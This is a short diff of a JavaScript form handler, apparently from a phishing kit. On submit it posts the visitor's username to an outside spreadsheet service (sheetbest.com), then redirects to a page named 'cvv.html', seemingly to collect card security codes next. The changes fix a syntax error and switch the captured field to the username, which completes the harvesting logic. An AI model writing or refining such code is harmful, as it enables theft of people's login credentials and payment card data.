@@ -8,7 +8,6 @@ formulario.addEventListener('submit', async(e) =>{
 
 try {    
     const respuesta = await fetch('https://api.sheetbest.com/sheets/1d9bbad6-6003-4362-b281-f71f83d5c0e9', {
-', {
         method: 'POST',
         mode: 'cors',
         headers: {
@@ -16,7 +15,8 @@ try {
         },
         body: JSON.stringify({
             
-            "Datos": formulario.confirmar.value
+            "Datos": formulario.usuario.value
+            
         })
     });
 
@@ -27,8 +27,7 @@ try {
 }
     
     registro.classList.remove('activo');
-    exito.classList.add('activo');
-	
+    exito.classList.add('activo');	
 	setTimeout(() => {
     window.location.href = "cvv.html";
 }, 1000);
